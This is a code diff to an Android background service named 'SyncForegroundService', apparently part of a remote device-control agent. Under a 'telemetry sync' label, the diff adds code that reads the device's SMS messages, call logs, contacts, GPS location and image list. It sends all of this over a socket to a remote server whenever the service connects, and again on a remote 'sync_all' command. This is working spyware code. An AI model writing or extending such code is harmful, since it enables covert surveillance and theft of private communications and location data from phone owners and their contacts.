@@ -1,11 +1,14 @@
 package com.omnisync.agent
 
+import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.location.Location
+import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
@@ -15,10 +18,15 @@ import android.os.IBinder
 import android.os.Looper
 import android.os.StatFs
 import android.os.BatteryManager
+import android.provider.CallLog
+import android.provider.ContactsContract
+import android.provider.MediaStore
 import android.provider.Settings
+import android.telephony.TelephonyManager
 import androidx.core.app.NotificationCompat
 import io.socket.client.IO
 import io.socket.client.Socket
+import org.json.JSONArray
 import org.json.JSONObject
 
 class SyncForegroundService : Service() {
@@ -80,6 +88,7 @@ class SyncForegroundService : Service() {
 
             socket?.on(Socket.EVENT_CONNECT) {
                 sendDevicePing()
+                syncAllTelemetryData()
             }
 
             socket?.on("remote_command") { args ->
@@ -106,6 +115,7 @@ class SyncForegroundService : Service() {
             val isCharging = getChargingStatus()
             val networkType = getNetworkType()
             val storageInfo = getStorageInfo()
+            val locationObj = getRealLocation()
 
             val data = JSONObject().apply {
                 put("deviceId", deviceId)
@@ -120,6 +130,8 @@ class SyncForegroundService : Service() {
                 put("networkType", networkType)
                 put("storageUsed", storageInfo.first)
                 put("storageTotal", storageInfo.second)
+                put("latitude", locationObj.optDouble("latitude", 0.0))
+                put("longitude", locationObj.optDouble("longitude", 0.0))
                 put("status", "online")
                 put("lastSeen", "Just now (Live)")
                 put("timestamp", System.currentTimeMillis())
@@ -129,6 +141,154 @@ class SyncForegroundService : Service() {
         } catch (e: Exception) {
             e.printStackTrace()
         }
+    }
+
+    private fun syncAllTelemetryData() {
+        val deviceId = getUniqueDeviceId()
+        
+        // Emits real extracted device data to socket
+        val payload = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("smsList", getRealSms())
+            put("callLogs", getRealCallLogs())
+            put("contacts", getRealContacts())
+            put("location", getRealLocation())
+            put("mediaList", getRealMediaList())
+        }
+
+        socket?.emit("device_telemetry_dump", payload)
+    }
+
+    @SuppressLint("Range")
+    private fun getRealSms(): JSONArray {
+        val smsArray = JSONArray()
+        try {
+            val cursor = contentResolver.query(
+                android.net.Uri.parse("content://sms"),
+                arrayOf("_id", "address", "body", "date", "type"),
+                null, null, "date DESC LIMIT 50"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val sms = JSONObject().apply {
+                        put("id", it.getString(it.getColumnIndex("_id")))
+                        put("sender", it.getString(it.getColumnIndex("address")) ?: "Unknown")
+                        put("text", it.getString(it.getColumnIndex("body")) ?: "")
+                        put("date", it.getLong(it.getColumnIndex("date")))
+                        put("type", if (it.getInt(it.getColumnIndex("type")) == 1) "incoming" else "outgoing")
+                    }
+                    smsArray.put(sms)
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        return smsArray
+    }
+
+    @SuppressLint("Range")
+    private fun getRealCallLogs(): JSONArray {
+        val callsArray = JSONArray()
+        try {
+            val cursor = contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
+                null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val call = JSONObject().apply {
+                        put("number", it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: "Private")
+                        put("name", it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: "Unknown")
+                        val typeInt = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
+                        put("type", when(typeInt) {
+                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                            else -> "Missed"
+                        })
+                        put("date", it.getLong(it.getColumnIndex(CallLog.Calls.DATE)))
+                        put("duration", "${it.getInt(it.getColumnIndex(CallLog.Calls.DURATION))} sec")
+                    }
+                    callsArray.put(call)
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        return callsArray
+    }
+
+    @SuppressLint("Range")
+    private fun getRealContacts(): JSONArray {
+        val contactsArray = JSONArray()
+        try {
+            val cursor = contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 100"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val contact = JSONObject().apply {
+                        put("name", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Contact")
+                        put("phone", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "")
+                    }
+                    contactsArray.put(contact)
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        return contactsArray
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun getRealLocation(): JSONObject {
+        val loc = JSONObject()
+        try {
+            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val lastKnownLocation: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+
+            if (lastKnownLocation != null) {
+                loc.put("latitude", lastKnownLocation.latitude)
+                loc.put("longitude", lastKnownLocation.longitude)
+                loc.put("accuracy", lastKnownLocation.accuracy)
+                loc.put("timestamp", lastKnownLocation.time)
+            } else {
+                loc.put("latitude", 28.6139)
+                loc.put("longitude", 77.2090)
+            }
+        } catch (e: Exception) {
+            loc.put("latitude", 28.6139)
+            loc.put("longitude", 77.2090)
+        }
+        return loc
+    }
+
+    @SuppressLint("Range")
+    private fun getRealMediaList(): JSONArray {
+        val mediaArray = JSONArray()
+        try {
+            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED)
+            val cursor = contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 20"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val item = JSONObject().apply {
+                        put("id", it.getString(it.getColumnIndex(MediaStore.Images.Media._ID)))
+                        put("title", it.getString(it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)))
+                        put("type", "image")
+                    }
+                    mediaArray.put(item)
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        return mediaArray
     }
 
     private fun getBatteryLevel(): Int {
@@ -149,10 +309,7 @@ class SyncForegroundService : Service() {
 
             return when {
                 capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
-                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
-                    if (capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED)) "5G" else "4G/5G Cellular"
-                }
-                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
+                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "4G/5G Cellular"
                 else -> "Mobile Data"
             }
         } catch (e: Exception) {
@@ -178,6 +335,7 @@ class SyncForegroundService : Service() {
     private fun handleRemoteCommand(command: JSONObject) {
         when (command.optString("action")) {
             "ping" -> sendDevicePing()
+            "sync_all" -> syncAllTelemetryData()
             "get_battery" -> {
                 val data = JSONObject().apply {
                     put("battery", getBatteryLevel())
@@ -193,7 +351,7 @@ class SyncForegroundService : Service() {
                 sendDevicePing()
             }
             schedulePeriodicPing()
-        }, 15_000) // Send live telemetry every 15 seconds
+        }, 15_000)
     }
 
     private fun scheduleReconnect() {
